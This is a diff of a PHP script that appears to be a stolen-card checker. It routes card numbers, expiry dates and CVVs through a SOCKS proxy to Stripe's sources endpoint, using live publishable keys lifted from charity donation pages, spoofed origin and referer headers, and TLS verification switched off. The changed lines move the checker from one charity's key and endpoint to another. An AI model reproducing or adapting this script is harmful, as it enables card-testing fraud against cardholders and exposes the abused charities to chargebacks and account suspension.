@@ -1,6 +1,6 @@
 <?php
 
-////////////////////////////===[khudka api banalo bc]
+////////////////////////////===[As of now we are using Stripe Gateway from https://bringmehope.org/donate/ it use v1/sources]
 
 error_reporting(0);
 set_time_limit(0);
@@ -71,15 +71,15 @@ $ch = curl_init();
 // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
 ////////=========Socks Proxy
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept: application/json',
 'accept-encoding: gzip, deflate, br', 
 'content-type: application/x-www-form-urlencoded',
-'origin: https://checkout.stripe.com',
-'referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=1906c9f4-5c86-b7c3-d5b1-35ccad8aa90a',
+'origin: https://js.stripe.com',
+'referer: https://js.stripe.com/v3/controller-6939e707ed72449242ad28283df1d390.html',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-site'));
@@ -90,7 +90,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Frockwellridewell.org%2F%3Fcampaign%3Dmake-a-donation%26donate%3D1&pasted_fields=number&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]=cyronavila%40gmail.com&time_on_page=165867&guid=c32ea8ce-7441-43c0-9448-e50fb6447e3f&muid=11b24020-e2fe-46f9-93cc-0067c9715434&sid=7dbb9b0c-9dda-4490-8f81-6db7900dca34&key=pk_live_iUEhsuVs9Uohtd200Ys8CvuN');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.'+'.$last.'&owner[email]='.$email.'&owner[address][line1]='.$street.'&owner[address][city]='.$city.'&owner[address][state]='.$state.'&owner[address][postal_code]='.$postcode.'&owner[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=5d5194f4-9afe-482a-891c-410fb24acd8d&sid=172c3634-ab01-4152-b4ce-c17552594133&pasted_fields=number&payment_user_agent=stripe.js%2Fed246b72%3B+stripe-js-v3%2Fed246b72&time_on_page=104441&referrer=https%3A%2F%2Fbringmehope.org%2Fdonate%2F&key=pk_live_8Ft339UAdyZSEgltJJpT87y300VlZCVKir');
 $result = curl_exec($ch);
 
 ///$token = trim(strip_tags(getStr($result,'"id": "','"')));
